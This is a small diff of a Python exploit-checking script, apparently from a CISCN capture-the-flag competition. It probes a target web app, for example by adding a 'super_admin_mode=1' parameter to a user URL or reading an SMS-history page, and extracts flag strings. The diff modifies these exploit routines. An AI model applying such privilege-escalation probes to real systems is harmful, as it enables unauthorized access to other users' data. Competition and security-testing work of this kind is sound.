@@ -122,7 +122,7 @@ class WebExp:
         sol2=re.search('CISCN\\{.*?}',self.session.get(self.url+'user/2?super_admin_mode=1').text)
         if sol2:
             print 'exp2:',sol2.group()
-            # return True
+            return True
         else:
             print 'exp2 fixed'
 
@@ -184,7 +184,8 @@ class WebExp:
         })
         #print rs.text
         # print self.session.get(self.url+'user/check/regen').text
-        sol1=re.search('CISCN\\{.*?}',self.session.get(self.url+'user/check/regen').text)
+        self.session.get(self.url + 'user/check/regen')
+        sol1=re.search('CISCN\\{.*?}',self.session.get(self.url+'settings/sms_history').text)
        
         if sol1:
             print 'exp1:',sol1.group()
